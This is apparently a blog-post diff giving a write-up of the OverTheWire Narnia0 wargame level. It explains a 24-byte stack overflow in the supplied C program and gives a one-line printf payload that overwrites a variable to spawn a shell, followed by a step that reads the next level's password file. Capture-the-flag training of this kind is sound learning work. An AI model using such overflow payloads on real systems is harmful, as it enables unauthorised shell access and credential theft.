@@ -1,0 +1,59 @@
+---
+layout: post
+title:  "Narnia0"
+tags: binary re narnia wargames
+exerpt_seperator: <!--more-->
+---
+In these series of posts I'm going to share my write-ups for the Narnia challenge of [WarGames](https://overthewire.org/wargames/).  
+Enjoy! :) 
+<!--more-->
+
+So here is what narnia0.c contains:
+
+	#include <stdio.h>
+	#include <stdlib.h>
+
+	int main(){
+	    long val=0x41414141;
+	    char buf[20];
+
+	    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+	    printf("Here is your chance: ");
+	    scanf("%24s",&buf);
+
+	    printf("buf: %s\n",buf);
+	    printf("val: 0x%08x\n",val);
+
+	    if(val==0xdeadbeef){
+	        setreuid(geteuid(),geteuid());
+	        system("/bin/sh");
+	    }
+	    else {
+	        printf("WAY OFF!!!!\n");
+	        exit(1);
+	    }
+
+	    return 0;
+	}
+
+
+Our job is to change the value of **val** from *0x41414141* into *deadbeef*, so then be able to get a shell with **narnia1** user access.  
+
+The program asks us to enter a string with 24 bytes length.  
+Now when the *main* function executes, it will free up space in stack for the local variables. Here val and buf.  
+The address of the buf variable in stack is lower than val and it's been specified that buf is a 20 bytes size string. So the remaining 4 bytes will be written into val.  
+All we have to do is to choose the first 20 bytes as whatever as we want and the next four bytes, deadbeef.
+
+The trick is that processors we use store data in *little-endian* format. Meaning that the least significant byte goes into the smallest address.  
+So our desired string should be something like this:  
+	
+	12345678901234567890efbeadde
+
+Keep in mind that deadbeef is actually a hex value.  
+
+We use **printf** for writing our string in proper format and **cat** for keeping shell open.  
+Another trick here is to use a *subshell*. So the desired shell won't get closed. Using parentheses around the command we can do so:
+
+	(printf "12345678901234567890\xef\xbe\xad\xde"; cat - ) | ./narnia0
+
+Congrats! You got the shell, now you just need to use cat for viewing the narnia1 user password from **/narnia_pass/** directory.
